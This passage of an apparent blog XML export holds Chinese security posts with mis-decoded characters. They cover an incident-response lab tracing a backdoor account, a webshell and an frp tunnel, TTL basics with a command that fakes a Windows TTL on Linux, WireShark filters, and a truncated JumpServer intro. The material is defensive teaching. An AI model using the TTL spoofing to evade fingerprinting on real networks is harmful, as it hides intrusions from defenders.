src="/img/Emergency-WinServer-web2/image-20240303164407557.png" alt="image-20240303164407557"></p><p>å…·ä½“æ‰§è¡Œäº†ä»€ä¹ˆæ“ä½œï¼Œå¦‚æœæ­¤æ—¶æœ‰å ¡å’æœºçš„å­˜åœ¨ï¼Œè¿½æŸ¥å°†ä¼šå˜å¾—éå¸¸å®¹æ˜“ï¼Œä½†æ˜¯æ²¡æœ‰ï¼Œæˆ‘ä»¬åªèƒ½é€šè¿‡æ—¥å¿—å’Œç¿»æ‰¾ç­‰æ–¹å¼è¿›è¡Œæ£€æŸ¥</p><p>é”å®šæ—¥å¿—æ—¶é—´æ®µï¼Œå¯¹<code>system.php</code>æ–‡ä»¶çš„è®¿é—®åœ¨29æ—¥13:08:49 åˆ° 13:38:02ï¼Œè€Œ <code>hack887$</code> ç”¨æˆ·åœ¨13:27:11 çš„æ—¶å€™åˆ›å»ºäº†åé—¨ç”¨æˆ·</p><p><img src="/img/Emergency-WinServer-web2/image-20240303171808844.png" alt="image-20240303171808844"></p><p>æ—¢ç„¶åˆ›å»ºäº†åé—¨ç”¨æˆ·ï¼Œæ˜¯å¦è¿›è¡Œäº†ç™»é™†å‘¢ï¼Œåœ¨å®‰å…¨æ—¥å¿—ä¸­é”å®š13.27.11 ä¹‹åçš„ç™»é™†æˆåŠŸçš„æ—¥å¿—ï¼Œå‘ç°åœ¨13:28:45åˆ†è¿›è¡Œäº†ç™»é™†</p><p><img src="/img/Emergency-WinServer-web2/image-20240303173527266.png" alt="image-20240303173527266"></p><p>è€Œç™»é™†çš„IP æ˜¯<code>192.1168.126.129</code></p><p><img src="/img/Emergency-WinServer-web2/image-20240303173631243.png" alt="image-20240303173631243"></p><p>é‚£ä¹ˆä¹‹ååšäº†å“ªäº›æ“ä½œå‘¢ï¼Ÿæˆ‘ä»¬è¿™é‡Œç”¨ä¸€ä¸ªå·¥å…·<code>LastActivityView</code>ï¼Œå¿«é€Ÿçš„æ’æŸ¥è¿‘æœŸè¢«è®¿é—®è¿‡çš„æ–‡ä»¶</p><p><img src="/img/Emergency-WinServer-web2/image-20240303172009048.png" alt="image-20240303172009048"></p><p>åœ¨ 13:44:13 çš„æ—¶å€™è®¿é—®è¿‡ä¸€ä¸ªç–‘ä¼¼QQå·çš„æ–‡ä»¶å¤¹å</p><p><img src="/img/Emergency-WinServer-web2/image-20240303174034149.png" alt="image-20240303174034149"></p><p>å¹¶ä¸”åœ¨ 13:47:30 çš„æ—¶å€™è®¿é—®äº†frpc.ini.txtæ–‡ä»¶ï¼Œæˆ‘ä»¬æ‰¾åˆ°ç›¸å…³ç›®å½•ï¼Œå‘ç°äº†frp éš§é“ç›¸å…³æ–‡ä»¶</p><p><img src="/img/Emergency-WinServer-web2/image-20240303172205215.png" alt="image-20240303172205215"></p><p>æŸ¥çœ‹frpc.ini æ–‡ä»¶ï¼Œå‘ç°frps æœåŠ¡çš„ç›¸å…³IPå’Œ ç«¯å£</p><p><img src="/img/Emergency-WinServer-web2/image-20240303172254385.png" alt="image-20240303172254385"></p><h1 id="å…«ã€å·¥å…·ä¸€æŠŠæ¢­"><a href="#å…«ã€å·¥å…·ä¸€æŠŠæ¢­" class="headerlink" title="å…«ã€å·¥å…·ä¸€æŠŠæ¢­"></a>å…«ã€å·¥å…·ä¸€æŠŠæ¢­</h1><h3 id="1ã€åé—¨ç”¨æˆ·"><a href="#1ã€åé—¨ç”¨æˆ·" class="headerlink" title="1ã€åé—¨ç”¨æˆ·"></a>1ã€åé—¨ç”¨æˆ·</h3><p><img src="/img/Emergency-WinServer-web2/image-20240303175040638.png" alt="image-20240303175040638"></p><p><img src="/img/Emergency-WinServer-web2/image-20240303175026294.png" alt="image-20240303175026294"></p><h3 id="2ã€webshell-æœ¨é©¬æ–‡ä»¶"><a href="#2ã€webshell-æœ¨é©¬æ–‡ä»¶" class="headerlink" title="2ã€webshell æœ¨é©¬æ–‡ä»¶"></a>2ã€webshell æœ¨é©¬æ–‡ä»¶</h3><p><img src="/img/Emergency-WinServer-web2/image-20240303174944177.png" alt="image-20240303174944177"></p>]]></content>
      
      
      <categories>
          
          <category> åº”æ€¥é¶åœº </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å…¥ä¾µæ’æŸ¥ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€åŸºç¡€çŸ¥è¯†ã€‘è®¡ç®—æœºç½‘ç»œTTLå€¼è¯¦è§£</title>
      <link href="/2024/03/01/Nouns-TTL/"/>
      <url>/2024/03/01/Nouns-TTL/</url>
      
        <content type="html"><![CDATA[<h1 id="ã€åŸºç¡€çŸ¥è¯†ã€‘è®¡ç®—æœºç½‘ç»œTTLå€¼è¯¦è§£"><a href="#ã€åŸºç¡€çŸ¥è¯†ã€‘è®¡ç®—æœºç½‘ç»œTTLå€¼è¯¦è§£" class="headerlink" title="ã€åŸºç¡€çŸ¥è¯†ã€‘è®¡ç®—æœºç½‘ç»œTTLå€¼è¯¦è§£"></a>ã€åŸºç¡€çŸ¥è¯†ã€‘è®¡ç®—æœºç½‘ç»œTTLå€¼è¯¦è§£</h1><h1 id="ä¸€ã€TTLä»‹ç»"><a href="#ä¸€ã€TTLä»‹ç»" class="headerlink" title="ä¸€ã€TTLä»‹ç»"></a>ä¸€ã€TTLä»‹ç»</h1><p>TTLï¼šæ•°æ®æŠ¥æ–‡çš„ç”Ÿå­˜å‘¨æœŸ</p><p>å½“æˆ‘ä»¬å‘é€ä¸€ä¸ªæ•°æ®åŒ…æ—¶ï¼Œè¯¥æ•°æ®åŒ…æ¯ç»è¿‡ä¸€ä¸ªè·¯ç”±èŠ‚ç‚¹ï¼ŒTTL å€¼å°†ä¼šå‡ä¸€ï¼Œå¦‚æœTTLå‡å°‘åˆ°é›¶ï¼Œæ•°æ®åŒ…ä¾ç„¶æ²¡æœ‰é€è¾¾åˆ°ç›®æ ‡åœ°ç‚¹ï¼Œå°±ä¼šè¿”å›Time to live exceededï¼ˆè¶…è¿‡ç”Ÿå­˜æ—¶é—´ï¼‰ï¼Œå¯¼è‡´è®¡ç®—æœºä¸èƒ½æ­£å¸¸ä¸Šç½‘</p><p><img src="/img/Nouns-TTL/image-20240301131636848.png" alt="image-20240301131636848"></p><h1 id="äºŒã€Linux-ä¸­çš„TTL-å€¼"><a href="#äºŒã€Linux-ä¸­çš„TTL-å€¼" class="headerlink" title="äºŒã€Linux ä¸­çš„TTL å€¼"></a>äºŒã€Linux ä¸­çš„TTL å€¼</h1><p>linuxæ“ä½œç³»ç»Ÿé»˜è®¤çš„ttl å€¼ä¸º64ï¼Œç›¸å…³æ–‡ä»¶ä½äºï¼š<code>/proc/sys/net/ipv4/ip_default_ttl</code></p><p>ä¿®æ”¹linux çš„ttl å€¼ ä¸º128ï¼Œä¼ªé€ windowsç³»ç»Ÿ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;128&quot; &gt; /proc/sys/net/ipv4/ip_default_ttl</span><br></pre></td></tr></table></figure><h1 id="ä¸‰ã€Windows-ä¸­çš„TTL-å€¼"><a href="#ä¸‰ã€Windows-ä¸­çš„TTL-å€¼" class="headerlink" title="ä¸‰ã€Windows ä¸­çš„TTL å€¼"></a>ä¸‰ã€Windows ä¸­çš„TTL å€¼</h1><p>windowsä¸­é»˜è®¤çš„ttlå€¼é€šå¸¸æ˜¯128</p><h3 id="1ã€å‘½ä»¤ä¿®æ”¹ttlå€¼"><a href="#1ã€å‘½ä»¤ä¿®æ”¹ttlå€¼" class="headerlink" title="1ã€å‘½ä»¤ä¿®æ”¹ttlå€¼"></a>1ã€å‘½ä»¤ä¿®æ”¹ttlå€¼</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh interface ipv4 set global defaultcurhoplimit=&lt;æ–°TTLå€¼&gt;</span><br></pre></td></tr></table></figure><h3 id="2ã€æ³¨å†Œè¡¨ä¿®æ”¹ttlå€¼"><a href="#2ã€æ³¨å†Œè¡¨ä¿®æ”¹ttlå€¼" class="headerlink" title="2ã€æ³¨å†Œè¡¨ä¿®æ”¹ttlå€¼"></a>2ã€æ³¨å†Œè¡¨ä¿®æ”¹ttlå€¼</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters</span><br></pre></td></tr></table></figure><p>pingç½‘å…³å¯ä»¥ç›´æ¥æŸ¥çœ‹åˆ°æœ¬åœ°çš„ttl å€¼</p><h1 id="å››ã€è·¯ç”±èŠ‚ç‚¹æŸ¥çœ‹"><a href="#å››ã€è·¯ç”±èŠ‚ç‚¹æŸ¥çœ‹" class="headerlink" title="å››ã€è·¯ç”±èŠ‚ç‚¹æŸ¥çœ‹"></a>å››ã€è·¯ç”±èŠ‚ç‚¹æŸ¥çœ‹</h1><h3 id="1ã€ping-å‘½ä»¤"><a href="#1ã€ping-å‘½ä»¤" class="headerlink" title="1ã€ping å‘½ä»¤"></a>1ã€ping å‘½ä»¤</h3><p>åˆ°è¾¾ç›®æ ‡æ—¶ttl çš„æ•°å€¼ï¼Œå³å‰©ä¸‹çš„è·³åŠ¨æ¬¡æ•°</p><p><img src="/img/Nouns-TTL/image-20240301132600127.png" alt="image-20240301132600127"></p><h3 id="2ã€mtr-å·¥å…·"><a href="#2ã€mtr-å·¥å…·" class="headerlink" title="2ã€mtr å·¥å…·"></a>2ã€mtr å·¥å…·</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt update</span><br><span class="line">apt install mtr</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mtr xueshengit.com</span><br></pre></td></tr></table></figure><p>ç»è¿‡äº†10ä¸ªè·¯ç”±èŠ‚ç‚¹</p><p><img src="/image-20240301132135982.png" alt="image-20240301132135982"></p>]]></content>
      
      
      <categories>
          
          <category> åŸºç¡€çŸ¥è¯† </category>
          
      </categories>
      
      
        <tags>
            
            <tag> TTL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€æµé‡åˆ†æã€‘æµé‡æŠ“åŒ…å·¥å…·WireSharkçš„åŸºæœ¬ä½¿ç”¨</title>
      <link href="/2024/03/01/Blue-Team-Packet-Sniffing-WireShark/"/>
      <url>/2024/03/01/Blue-Team-Packet-Sniffing-WireShark/</url>
      
        <content type="html"><![CDATA[<h1 id="æµé‡æŠ“åŒ…å·¥å…·WireSharkçš„åŸºæœ¬ä½¿ç”¨"><a href="#æµé‡æŠ“åŒ…å·¥å…·WireSharkçš„åŸºæœ¬ä½¿ç”¨" class="headerlink" title="æµé‡æŠ“åŒ…å·¥å…·WireSharkçš„åŸºæœ¬ä½¿ç”¨"></a>æµé‡æŠ“åŒ…å·¥å…·WireSharkçš„åŸºæœ¬ä½¿ç”¨</h1><h2 id="ä¸€ã€WireShark-ç®€ä»‹"><a href="#ä¸€ã€WireShark-ç®€ä»‹" class="headerlink" title="ä¸€ã€WireShark ç®€ä»‹"></a>ä¸€ã€WireShark ç®€ä»‹</h2><p>å®˜ç½‘ï¼š<a href="http://www.wireshark.org/">www.wireshark.org</a></p><p>æ˜¯ä¸€ä¸ªç½‘ç»œåŒ…åˆ†æå·¥å…·ï¼Œä½¿ç”¨WinPCAPä½œä¸ºæ¥å£ï¼Œç›´æ¥ä¸ç½‘å¡è¿›è¡Œæ•°æ®æŠ¥æ–‡äº¤äº’ï¼ŒæŠ“å–ç½‘å¡ä¸Šçš„æµé‡æ•°æ®åŒ…ï¼Œå¯¹ç½‘ç»œæ•°æ®åŒ…è¿›è¡Œè¯¦ç»†çš„åˆ¨æåˆ†æã€‚</p><p>å¯ä»¥ç”¨WireShark æ¥æ£€æµ‹ç½‘ç»œè¿æ¥é—®é¢˜ï¼Œä¹Ÿå¯ä»¥ç”¨WireShark æ¥æŠ“å–ç½‘ç»œä¸Šçš„æ•æ„Ÿä¿¡æ¯ï¼Œçªƒå–æ•°æ®ã€‚WireShark é»˜è®¤æƒ…å†µä¸‹ï¼Œä½¿ç”¨æ··æ‚æ¨¡å¼ï¼Œå³æŠ“å–æµç»æœ¬åœ°çš„æ•°æ®åŒ…ï¼›é‚£ä¹ˆæ™®é€šæ¨¡å¼ä¸‹ï¼Œåªä¼šæŠ“å–æµå…¥æœ¬åœ°çš„æ•°æ®åŒ…ã€‚</p><h2 id="äºŒã€WireShark-å¿«é€Ÿå®šä½æ•°æ®åŒ…"><a href="#äºŒã€WireShark-å¿«é€Ÿå®šä½æ•°æ®åŒ…" class="headerlink" title="äºŒã€WireShark å¿«é€Ÿå®šä½æ•°æ®åŒ…"></a>äºŒã€WireShark å¿«é€Ÿå®šä½æ•°æ®åŒ…</h2><h3 id="1ã€å¸¸è§çš„åè®®"><a href="#1ã€å¸¸è§çš„åè®®" class="headerlink" title="1ã€å¸¸è§çš„åè®®"></a>1ã€å¸¸è§çš„åè®®</h3><p>APRã€ICMPã€TCPã€UDPã€DNSã€HTTP</p><h3 id="2ã€é€‰æ‹©ç½‘å¡æ¥å£"><a href="#2ã€é€‰æ‹©ç½‘å¡æ¥å£" class="headerlink" title="2ã€é€‰æ‹©ç½‘å¡æ¥å£"></a>2ã€é€‰æ‹©ç½‘å¡æ¥å£</h3><p>1ã€åŒå‡»è¿›å»ç½‘å¡æ¥å£</p><p><img src="/img/Blue-Team-Packet-Sniffing-WireShark/image_20240229203345148.png" alt="image_20240229203345148"></p><p>2ã€ä½¿ç”¨æ¥å£è¿‡æ»¤å™¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">1ã€ä»…æ•è·ä¸10.1.159.86 è¿›è¡Œäº¤äº’çš„æµé‡</span><br><span class="line">host 10.1.159.86</span><br><span class="line">2ã€è·å–10.1.159.86 ä¸ºæºIPçš„æ•°æ®åŒ…</span><br><span class="line">src host 10.1.159.86</span><br><span class="line">3ã€è·å–10.1.159.86 ä¸ºç›®æ ‡IPçš„æ•°æ®åŒ…</span><br><span class="line">dst host 10.1.159.86</span><br><span class="line">4ã€è·å–ç›®æ ‡ä¸º10.1.159.86 ä¸”ç«¯å£ä¸º80</span><br><span class="line">dst host 10.1.159.86 &amp;&amp; prot 80</span><br><span class="line">5ã€æ•è·é80ç«¯å£æµé‡</span><br><span class="line">!prot 80</span><br><span class="line">6ã€ä»…æ•è·ICMPåè®®æ•°æ®åŒ…</span><br><span class="line">icmp</span><br><span class="line">7ã€æ•è·IPv4</span><br><span class="line">!ip6</span><br></pre></td></tr></table></figure><p><img src="/img/Blue-Team-Packet-Sniffing-WireShark/image_20240246429203147.png" alt="image_20240246429203147"></p><p><img src="/img/Blue-Team-Packet-Sniffing-WireShark/image-20240229205033732.png" alt="image-20240229205033732"></p><h3 id="3ã€æ•°æ®åŒ…ç€è‰²å¿«é€Ÿé”å®š"><a href="#3ã€æ•°æ®åŒ…ç€è‰²å¿«é€Ÿé”å®š" class="headerlink" title="3ã€æ•°æ®åŒ…ç€è‰²å¿«é€Ÿé”å®š"></a>3ã€æ•°æ®åŒ…ç€è‰²å¿«é€Ÿé”å®š</h3><p>WireShark å¯¹ä¸åŒæ•°æ®åŒ…æœ‰ä¸åŒçš„é¢œè‰²åˆ’åˆ†ï¼Œç†ŸçŸ¥é»˜è®¤é¢œè‰²èƒ½å¿«é€Ÿçš„åˆ†åˆ«ä¸åŒçš„æ•°æ®åŒ…ã€‚è¿˜å¯ä»¥è‡ªå®šä¹‰é¢œè‰²è§„åˆ™</p><p><img src="/img/Blue-Team-Packet-Sniffing-WireShark/image-20240229211150293.png" alt="image-20240229211150293"></p><h3 id="4ã€åº”ç”¨æ˜¾ç¤ºè¿‡æ»¤å™¨"><a href="#4ã€åº”ç”¨æ˜¾ç¤ºè¿‡æ»¤å™¨" class="headerlink" title="4ã€åº”ç”¨æ˜¾ç¤ºè¿‡æ»¤å™¨"></a>4ã€åº”ç”¨æ˜¾ç¤ºè¿‡æ»¤å™¨</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1ã€ç­›é€‰åè®®</span><br><span class="line">tcpã€udpã€icmp</span><br><span class="line">2ã€ä¸IPç›¸å…³çš„åè®®</span><br><span class="line">ip.addr == 192.168.31.52</span><br><span class="line">3ã€æºã€ç›®æ ‡IP</span><br><span class="line">ip.src == 192.168.31.52</span><br><span class="line">ip.dst == 192.168.31.52</span><br><span class="line">4ã€ä½¿ç”¨and</span><br><span class="line">ip.src == 192.168.31.1 and ip.dst == 192.168.31.52</span><br><span class="line">5ã€ç­›é€‰httpè¯·æ±‚ï¼š</span><br><span class="line">http.request.method == &quot;POST&quot;</span><br><span class="line">http.request.uri.path == &quot;/admin.php&quot;</span><br></pre></td></tr></table></figure><p><img src="/img/Blue-Team-Packet-Sniffing-WireShark/image-20240229211946705.png" alt="image-20240229211946705"></p><p>ç­›é€‰udp å‡ºç° dnsã€nbnsåè®®ï¼Œå› ä¸ºè¿™äº›åº”ç”¨å±‚åè®®æ˜¯åŸºäºä¼ è¾“å±‚udp åè®®çš„</p><p><img src="/img/Blue-Team-Packet-Sniffing-WireShark/image-20240229212511973.png" alt="image-20240229212511973"></p><p>ç­›é€‰httpåè®®å‡ºç°tcpã€ocsp åè®®ï¼Œæ˜¯å› ä¸º HTTP é€šä¿¡ä¾èµ–äº TCP åè®®ï¼Œè€Œ OCSP æ˜¯ HTTPS é€šä¿¡ä¸­ç”¨äºè¯ä¹¦éªŒè¯çš„ä¸€ä¸ªç»„æˆéƒ¨åˆ†ï¼Œå®ƒä»¬éƒ½æ˜¯ç½‘ç»œé€šä¿¡ä¸­å¸¸è§çš„åè®®ã€‚</p><h3 id="5ã€å¸¸è§åè®®åˆ†æARP"><a href="#5ã€å¸¸è§åè®®åˆ†æARP" class="headerlink" title="5ã€å¸¸è§åè®®åˆ†æARP"></a>5ã€å¸¸è§åè®®åˆ†æARP</h3><p>ARPåè®®ï¼šåœ°å€è§£æåè®®ï¼Œé€šè¿‡è§£æç½‘ç»œå±‚åœ°å€æ¥æ‰¾å¯»æ•°æ®é“¾è·¯å±‚åœ°å€çš„ç½‘ç»œä¼ è¾“åè®®ï¼Œå³å®šä½MACåœ°å€</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">å¦‚ping ä¸€ä¸ªip</span><br><span class="line">ä¼šå…ˆæŸ¥çœ‹è¯¥IP æ˜¯å¦åœ¨æœ¬åœ°æœ‰arpç¼“å­˜ï¼Œæœ‰çš„è¯ç›´æ¥å‘é€icmpæ•°æ®åŒ…</span><br><span class="line">æ²¡æœ‰çš„è¯ä¼šå…ˆè¿”é€arpæ•°æ®åŒ…ï¼Œå†å‘é€icmpæ•°æ®åŒ…</span><br></pre></td></tr></table></figure><p>åè®®åˆ†æçš„æ—¶å€™æˆ‘ä»¬éœ€è¦å…³é—­æ··æ·†æ¨¡å¼ï¼Œé¿å…ä¸€äº›å¹²æ‰°çš„æ•°æ®åŒ…å­˜åœ¨ï¼ŒåªæŠ“å–æµå…¥æœ¬åœ°è®¡ç®—æœºå’Œå¹¿æ’­æ•°æ®åŒ…</p><p><img src="/img/Blue-Team-Packet-Sniffing-WireShark/image-20240301103107969.png" alt="image-20240301103107969"></p><p>åˆ†æARP æ•°æ®åŒ…</p><p><img src="/img/Blue-Team-Packet-Sniffing-WireShark/image-20240301104310639.png" alt="image-20240301104310639"></p><p><img src="/img/Blue-Team-Packet-Sniffing-WireShark/image-20240301104908518.png" alt="image-20240301104908518"></p><h3 id="6ã€å¸¸è§åè®®åˆ†æICMP"><a href="#6ã€å¸¸è§åè®®åˆ†æICMP" class="headerlink" title="6ã€å¸¸è§åè®®åˆ†æICMP"></a>6ã€å¸¸è§åè®®åˆ†æICMP</h3><p>æˆ‘ä»¬ç”¨æ™®é€šæ¨¡å¼æŠ“å–icmp æ•°æ®åŒ…ï¼ŒåªæŠ“å–ä¸€ä¸ªicmp æ•°æ®åŒ…</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping baidu.com -n 1</span><br></pre></td></tr></table></figure><p>åˆ†æICMP æ•°æ®åŒ…</p><p><img src="/img/Blue-Team-Packet-Sniffing-WireShark/image-20240301105939608.png" alt="image-20240301105939608"></p><p>ç›¸åº”åŒ…å’Œè¯·æ±‚åŒ…æ˜¯ä¸€æ ·çš„æ ¼å¼</p><h3 id="7ã€å¸¸è§åè®®åˆ†æTCP"><a href="#7ã€å¸¸è§åè®®åˆ†æTCP" class="headerlink" title="7ã€å¸¸è§åè®®åˆ†æTCP"></a>7ã€å¸¸è§åè®®åˆ†æTCP</h3><p>æˆ‘ä»¬å¯ä»¥åœ¨æœ¬åœ°æµè§ˆå™¨å»è®¿é—®ä¸€ä¸ªhttpç½‘é¡µ</p><p>åˆ†æTCP ä¸‰æ¬¡æ¡æ‰‹æ•°æ®åŒ…</p><p><img src="/img/Blue-Team-Packet-Sniffing-WireShark/image-20240301112108005.png" alt="image-20240301112108005"></p><p><img src="/img/Blue-Team-Packet-Sniffing-WireShark/image-20240301112507884.png" alt="image-20240301112507884"></p><p><img src="/img/Blue-Team-Packet-Sniffing-WireShark/image-20240301112643427.png" alt="image-20240301112643427"></p><p>å¯ä»¥åœ¨ã€ç»Ÿè®¡ã€‘ä¸­ã€æµé‡å›¾ã€‘å»æ›´åŠ ç›´è§‚çš„æŸ¥çœ‹æµé‡ï¼Œæµé‡ç±»å‹é€‰æ‹©ã€TCPã€‘</p><p><img src="/img/Blue-Team-Packet-Sniffing-WireShark/image-20240301113122950.png" alt="image-20240301113122950"></p><p>å››æ¬¡æŒ¥æ‰‹æ•°æ®åŒ…ä¸å†åˆ†æ</p><p><img src="/img/Blue-Team-Packet-Sniffing-WireShark/image-20240301124649718.png" alt="image-20240301124649718"></p><h3 id="8ã€å¸¸è§åè®®åˆ†æHTTP"><a href="#8ã€å¸¸è§åè®®åˆ†æHTTP" class="headerlink" title="8ã€å¸¸è§åè®®åˆ†æHTTP"></a>8ã€å¸¸è§åè®®åˆ†æHTTP</h3><p>HTTPæ˜¯TCP çš„ä¸Šå±‚åè®®ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿‡æ»¤TCPçš„æ•°æ®åŒ…ä¼šåŒ…å«http åè®®çš„æ•°æ®åŒ…</p><p>åˆ†æhttp çš„é¡µé¢è¯·æ±‚</p><p><img src="/img/Blue-Team-Packet-Sniffing-WireShark/image-20240301125329153.png" alt="image-20240301125329153"></p><p>å¯ä»¥è¿½è¸ªTCP æˆ– HTTPæµï¼ŒæŸ¥çœ‹è¯¦ç»†çš„æ•°æ®åŒ…è¯·æ±‚</p><p><img src="/img/Blue-Team-Packet-Sniffing-WireShark/image-20240301130029416.png" alt="image-20240301130029416"></p><h2 id="ä¸‰ã€WireShark-å¿«é€Ÿå®šä½æ•°æ®åŒ…â€”ç±»å‹"><a href="#ä¸‰ã€WireShark-å¿«é€Ÿå®šä½æ•°æ®åŒ…â€”ç±»å‹" class="headerlink" title="ä¸‰ã€WireShark å¿«é€Ÿå®šä½æ•°æ®åŒ…â€”ç±»å‹"></a>ä¸‰ã€WireShark å¿«é€Ÿå®šä½æ•°æ®åŒ…â€”ç±»å‹</h2><h3 id="1ã€å®šä½è¯·æ±‚ç±»å‹"><a href="#1ã€å®šä½è¯·æ±‚ç±»å‹" class="headerlink" title="1ã€å®šä½è¯·æ±‚ç±»å‹"></a>1ã€å®šä½è¯·æ±‚ç±»å‹</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http.request.method == &quot;GET&quot;</span><br><span class="line">http.request.method == &quot;POST&quot;</span><br></pre></td></tr></table></figure><h3 id="2ã€å®šä½å“åº”çŠ¶æ€ç "><a href="#2ã€å®šä½å“åº”çŠ¶æ€ç " class="headerlink" title="2ã€å®šä½å“åº”çŠ¶æ€ç "></a>2ã€å®šä½å“åº”çŠ¶æ€ç </h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http.response.code == 200</span><br></pre></td></tr></table></figure><h3 id="3ã€å®šä½è¯·æ±‚å¤´å­—æ®µ"><a href="#3ã€å®šä½è¯·æ±‚å¤´å­—æ®µ" class="headerlink" title="3ã€å®šä½è¯·æ±‚å¤´å­—æ®µ"></a>3ã€å®šä½è¯·æ±‚å¤´å­—æ®µ</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http.host == &quot;www.example.com&quot;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> è“é˜Ÿåº”æ€¥ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WireShark </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€å ¡å’æœºã€‘JumpServer å ¡å’æœºæ­å»ºå’Œä½¿ç”¨</title>
      <link href="/2024/02/29/Blue-Team-Bastion-Host-JumpServer/"/>
      <url>/2024/02/29/Blue-Team-Bastion-Host-JumpServer/</url>
      
        <content type="html"><![CDATA[<h1 id="JumpServer-å ¡å’æœºæ­å»ºå’Œä½¿ç”¨"><a href="#JumpServer-å ¡å’æœºæ­å»ºå’Œä½¿ç”¨" class="headerlink" title="JumpServer å ¡å’æœºæ­å»ºå’Œä½¿ç”¨"></a>JumpServer å ¡å’æœºæ­å»ºå’Œä½¿ç”¨</h1><h1 id="ä¸€ã€å ¡å’æœºä»‹ç»"><a href="#ä¸€ã€å ¡å’æœºä»‹ç»" class="headerlink" title="ä¸€ã€å ¡å’æœºä»‹ç»"></a>ä¸€ã€å ¡å’æœºä»‹ç»</h1><p>å ¡å’æœºï¼ˆBastion Hostï¼‰æ˜¯ä¸€ç§ç½‘ç»œå®‰å…¨è®¾å¤‡ï¼Œå®ƒåœ¨ä¸€ä¸ªç‰¹å®šçš„ç½‘ç»œç¯å¢ƒä¸‹ï¼Œä¸ºäº†ä¿éšœç½‘ç»œå’Œæ•°æ®ä¸å—å¤–éƒ¨å’Œå†…éƒ¨ç”¨æˆ·çš„å…¥ä¾µå’Œç ´åï¼Œè¿ç”¨å„ç§æŠ€æœ¯æ‰‹æ®µç›‘æ§å’Œè®°å½•è¿ç»´äººå‘˜å¯¹ç½‘ç»œå†…çš„æœåŠ¡å™¨ã€ç½‘ç»œè®¾å¤‡ã€å®‰å…¨è®¾å¤‡ã€æ•°æ®åº“ç­‰è®¾å¤‡çš„æ“ä½œè¡Œä¸ºã€‚å ¡å’æœºçš„æ ¸å¿ƒåŠŸèƒ½é€šå¸¸åŒ…æ‹¬4Aï¼šèº«ä»½éªŒè¯ï¼ˆAuthenticationï¼‰ã€è´¦å·ç®¡ç†ï¼ˆAccountï¼‰ã€æˆæƒæ§åˆ¶ï¼ˆAuthorizationï¼‰å’Œå®‰å…¨å®¡è®¡ï¼ˆAuditï¼‰ã€‚å®ƒå¸®åŠ©ä¼ä¸šå®ç°å¯¹ITèµ„æºçš„é›†ä¸­ç®¡ç†å’Œå®‰å…¨æ§åˆ¶ï¼Œç¡®ä¿åªæœ‰æˆæƒç”¨æˆ·æ‰èƒ½è®¿é—®ç‰¹å®šçš„ç³»ç»Ÿèµ„æºï¼Œå¹¶ä¸”æ‰€æœ‰æ“ä½œéƒ½ä¼šè¢«è®°å½•å’Œå®¡è®¡ï¼Œä»¥ä¾¿äºäº‹ååˆ†æå’Œè´£ä»»è¿½è¸ªã€‚</p><h1 id="äºŒã€JumpServer-å ¡å’æœº"><a href="#äºŒã€JumpServer-å ¡å’æœº" class="headerlink" title="äºŒã€JumpServer å ¡å’æœº"></a>äºŒã€JumpServer å ¡å’æœº</h1><p>å®˜ç½‘ï¼š<a href="https://www.jumpserver.org/">JumpServer - å¼€æºå ¡å’æœº - å®˜ç½‘</a><br>Githubï¼š<a href="https://github.com/jumpserver/jumpserver">JumpServer æ˜¯å¹¿å—æ¬¢è¿çš„å¼€æºå ¡å’æœº</a></p><p>JumpServer æ˜¯å…¨çƒé¦–æ¬¾å®Œå…¨å¼€æºçš„å ¡å’æœºï¼Œä½¿ç”¨ GNU GPL v2.0 å¼€æºåè®®ï¼Œæ˜¯ç¬¦åˆ 4A 